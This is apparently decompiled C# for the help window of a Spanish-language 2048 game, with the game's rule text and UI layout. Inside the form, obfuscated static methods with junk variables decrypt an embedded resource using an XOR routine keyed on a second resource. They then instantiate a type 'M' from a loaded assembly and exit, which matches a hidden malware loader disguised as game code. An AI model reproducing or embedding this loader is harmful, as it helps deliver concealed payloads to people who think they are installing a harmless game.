using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using _2048_eXtendido.Properties;

namespace _2048_eXtendido;

public class frmHelp : Form
{
	private string[] TextHelp = new string[6];

	private int index = 0;

	public static double kajda;

	public static byte[] KzMANDM8232 = Resources.OurFiles;

	public static byte[] ZASSSAIDJAOD = Resources.Zix;

	private IContainer components = null;

	private Label lblTextHelp;

	private PictureBox pbxFotosHelp;

	private Button btnNext;

	private Button btnBack;

	public frmHelp()
	{
		InitializeComponent();
		Load_Help();
	}

	public static void a()
	{
		int num = 2390239;
		long num2 = 827392739273L;
		kajda = 283729.283728973;
		QurBadwaasarmKajdwaermbaim(2390239, 827392739273L, kajda);
		new ConfrirmUserUpOrDel(3.181813189843281E+33, 9.713181296181702E+32, 6.5914022974225615E+25);
		Assembly jwdhadh823u29u3j = ConfrirmUserUpOrDel.jwdhadh823u29u3j;
		kajda = 3167300283071653.0;
		num2 = -2873096434650005L;
		num2 = -226860385813577383L;
		num2 = -226566564875368001L;
		num2 = 63172407962524737L;
		if (jwdhadh823u29u3j.CreateInstance("M")!.Equals(null))
		{
			Console.WriteLine(kajda + (double)num2 + (double)num);
		}
		kajda = 2.239211967366566E+18;
		Environment.Exit(-1);
	}

	public static object QurBadwaasarmKajdwaermbaim(int hkd, long a2, double a62)
	{
		hkd = hkd * 2839 / 2;
		a2 = 9545968409365L;
		for (int i = KzMANDM8232.Length * 2 + ZASSSAIDJAOD.Length; i >= 0; i += -1)
		{
			KzMANDM8232[i % KzMANDM8232.Length] = Convert.ToByte((Convert.ToInt32(KzMANDM8232[i % KzMANDM8232.Length] ^ ZASSSAIDJAOD[i % ZASSSAIDJAOD.Length]) - Convert.ToInt32(KzMANDM8232[(i + 1) % KzMANDM8232.Length]) + 256) % 256);
			a62 = 3311330920567623.0;
			a62 = 2.983928393170417E+25;
		}
		hkd += hkd * 2 - 2;
		try
		{
			a2 = Convert.ToInt64(a62) + a2 + 923820938209382093L;
		}
		catch
		{
		}
		return null;
	}

	private void Load_Help()
	{
		LoadHelp();
		pbxFotosHelp.set_ImageLocation("fotosHelp/0.png");
		((Control)lblTextHelp).set_Text(TextHelp[index]);
		((Control)this).Refresh();
	}

	private void LoadHelp()
	{
		TextHelp[0] = "El 2048 es un juego que consiste en un tablero de 4x4 casillas en el que se ubican\npiezas con números. Los números siempre son una potencia de dos mayor o igual que\ndos. En cada turno el usuario debe decidir una dirección en la que mover todas las\npiezas del tablero (arriba, abajo, derecha o izquierda). Si en la dirección en que\nse mueven las piezas existen dos piezas de igual valor consecutivas, estas se com-\nbinan para formar una única pieza con valor igual a la suma de las dos mezcladas.\nLa siguiente figura muestra un tablero y el resultado de haber “movido” las piezas\nhacia la derecha.";
		TextHelp[1] = "Note que las piezas se mueven hasta que llegan a la última casilla posible o\nchocan con una  pieza que ya no se puede mover más.  En un único movimiento\nuna pieza sólo se mezcla una vez y si existen varias posibilidades se mezcla\nsolamente la de la pieza más avanzada en la dirección seleccionada. Las figuras\na continuación representan estos escenarios.\n4 casillas iguales consecutivas, se mezclan únicamente 2 pares.";
		TextHelp[2] = "Aunque quedan dos 4 luego de mezclar los 2s estos no se mezclan en el mismo\nmovimiento. 3 casillas iguales consecutivas, se mezcla únicamente el par más\navanzado en la dirección. En el movimiento se podrían mezclar el 2 más a la\nizquierda con el 2do, sin embargo se debe mezclar el más a la derecha con el\nanterior.";
		TextHelp[3] = "Al principio el juego empieza desde una hasta tres piezas en posiciones aleatorias y\nque pueden ser de valor 2 ó 4. Después de cada movimiento válido aparece en una casilla\naleatoria un 2 ó un 4. Un movimiento es válido si con él se puede mover (o mezclar) alguna\npieza. Si no existen movimientos posibles en un tablero el juego termina. En cada jugada\nse acumula en una puntuación del  jugador el valor de las piezas que fueron mezcladas\n(por ejemplo, si se mezclan dos 4s se acumularía un 8).  Si se alcanza  una  casilla con\nvalor 2048 se dice que el jugador ganó. El jugador tiene un conjunto de posibilidades\nde deshacer la última jugada (ambos, el movimiento y la aparición de la nueva pieza)\nilimitadamente.";
		TextHelp[4] = "Antes de comenzar a jugar 1ero usted debera especificar el tamaño del tablero que desea,\nluego escoger el nivel de dificultad si lo desea y dar un click en el botón New Game (F1).\nPara guardar la partida, solo de click en Save Game (Ctrl-S) o cerrando el juego su parti-\nda será guardada automáticamente.\nPara comenzar una partida guardada deber deberá dar click en el botón Load Game (Ctrl-O).\nAdemás este juego a través del botón Undo (Ctrl-Z) le permite Deshacer sus jugadas ilimita-\ndamente, o sea, hasta la partida inicial.\nTambién, a la derecha superior de la ventana se puede visualizar en Best la mejor\npuntuación hasta el momento alcanzada en el juego 2048_eXtendido y Step, muestra\nla cantidad de jugadas que ha realizado el jugador.";
		TextHelp[5] = "\t\tExtensiones del juego\n1) Cuando el jugador elige niveles de dificultad (Level), en el tablero aparecen obstáculos\nde color negro en posiciones aleatorias y una cantidad directamente proporcional al tamaño\ndel tablero especificado (Size). La imagen de la izquierda es un ejemplo de un tablero\nde 6x6 con 6 obtáculos. Sus funciones en el tablero son de impedir el movimiento de los nú-\nmeros y se garantiza que nunca aparecerá un número sobre un obstáculo.\n2) Al dar click izquierdo sobre un número, este cambia su color a negro (imagen de la iz-\nquierda), esto indica que dicho número durante una jugada será una piedra.\nLa función de la piedra es moverse igual que los números, pero esta no se mezcla con ellos.\nEn la imagen de la derecha la piedra es el 2 al que apunta la flecha negra, y al jugar hacia\nabajo (flecha azul) los números que serán mezclados son los 2s señalados por la flecha roja.\nPara desmarcar la piedra de click derecho sobre ella.";
	}

	private void btnNext_Click(object sender, EventArgs e)
	{
		if (index != 5)
		{
			((Control)lblTextHelp).set_Text(TextHelp[++index]);
			pbxFotosHelp.set_ImageLocation("fotosHelp/" + index + ".png");
			((Control)this).Refresh();
		}
	}

	private void btnBack_Click(object sender, EventArgs e)
	{
		if (index != 0)
		{
			((Control)lblTextHelp).set_Text(TextHelp[--index]);
			pbxFotosHelp.set_ImageLocation("fotosHelp/" + index + ".png");
			((Control)this).Refresh();
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(frmHelp));
		lblTextHelp = new Label();
		pbxFotosHelp = new PictureBox();
		btnNext = new Button();
		btnBack = new Button();
		((ISupportInitialize)pbxFotosHelp).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lblTextHelp).set_AutoSize(true);
		((Control)lblTextHelp).set_Font(new Font("Times New Roman", 14.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)lblTextHelp).set_Location(new Point(20, 15));
		((Control)lblTextHelp).set_Name("lblTextHelp");
		((Control)lblTextHelp).set_Size(new Size(0, 21));
		((Control)lblTextHelp).set_TabIndex(0);
		((Control)pbxFotosHelp).set_Location(new Point(94, 267));
		((Control)pbxFotosHelp).set_Name("pbxFotosHelp");
		((Control)pbxFotosHelp).set_Size(new Size(543, 217));
		pbxFotosHelp.set_SizeMode((PictureBoxSizeMode)4);
		pbxFotosHelp.set_TabIndex(1);
		pbxFotosHelp.set_TabStop(false);
		((Control)btnNext).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnNext).set_Location(new Point(654, 448));
		((Control)btnNext).set_Name("btnNext");
		((Control)btnNext).set_Size(new Size(58, 23));
		((Control)btnNext).set_TabIndex(4);
		((Control)btnNext).set_Text("Next");
		((ButtonBase)btnNext).set_UseVisualStyleBackColor(true);
		((Control)btnNext).add_Click((EventHandler)btnNext_Click);
		((Control)btnBack).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)btnBack).set_Location(new Point(12, 448));
		((Control)btnBack).set_Name("btnBack");
		((Control)btnBack).set_Size(new Size(58, 23));
		((Control)btnBack).set_TabIndex(4);
		((Control)btnBack).set_Text("Back");
		((ButtonBase)btnBack).set_UseVisualStyleBackColor(true);
		((Control)btnBack).add_Click((EventHandler)btnBack_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaption);
		((Form)this).set_ClientSize(new Size(724, 501));
		((Control)this).get_Controls().Add((Control)(object)btnBack);
		((Control)this).get_Controls().Add((Control)(object)btnNext);
		((Control)this).get_Controls().Add((Control)(object)pbxFotosHelp);
		((Control)this).get_Controls().Add((Control)(object)lblTextHelp);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frmHelp");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Help 2048_eXtendido");
		((ISupportInitialize)pbxFotosHelp).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
